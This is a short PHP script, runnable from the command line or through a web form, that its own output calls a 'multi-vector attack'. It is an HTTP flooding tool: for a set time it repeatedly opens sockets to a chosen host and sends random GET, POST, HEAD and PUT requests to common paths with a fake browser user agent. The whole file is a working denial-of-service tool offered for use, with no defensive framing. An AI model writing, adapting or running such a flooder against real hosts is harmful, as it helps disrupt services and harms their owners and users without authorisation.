#!/usr/bin/php
<?php

if ($argc >= 4 || ($_SERVER['REQUEST_METHOD'] === 'POST')) {
    
    if ($argc >= 4) {
        // CLI mode
        $target = $argv[1];
        $duration = $argv[2];
        $threads = $argv[3];
    } else {
        // Web mode
        $target = $_POST['target'];
        $duration = $_POST['duration'];
        $threads = $_POST['threads'];
    }
    
    $target = str_replace(['http://', 'https://'], '', $target);
    $target = explode('/', $target)[0];
    
    echo "Starting PHP multi-vector attack on $target\n";
    echo "Duration: {$duration}s, Threads: {$threads}\n";
    
    $start_time = time();
    $end_time = $start_time + $duration;
    $request_count = 0;
    
    // Multi-vector attack function
    function send_attack($host, $port = 80) {
        $methods = ['GET', 'POST', 'HEAD', 'PUT'];
        $paths = ['/', '/index.html', '/admin', '/api', '/test'];
        
        $method = $methods[array_rand($methods)];
        $path = $paths[array_rand($paths)];
        
        $socket = @fsockopen($host, $port, $errno, $errstr, 2);
        if ($socket) {
            $payload = "{$method} {$path} HTTP/1.1\r\n";
            $payload .= "Host: {$host}\r\n";
            $payload .= "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n";
            $payload .= "Accept: */*\r\n";
            $payload .= "Connection: close\r\n\r\n";
            
            fwrite($socket, $payload);
            fclose($socket);
            return true;
        }
        return false;
    }
    
    // Attack loop
    while (time() < $end_time) {
        for ($i = 0; $i < $threads; $i++) {
            if (send_attack($target)) {
                $request_count++;
            }
        }
        usleep(100000); // 100ms delay
    }
    
    echo "PHP attack completed. Total requests: $request_count\n";
}

?>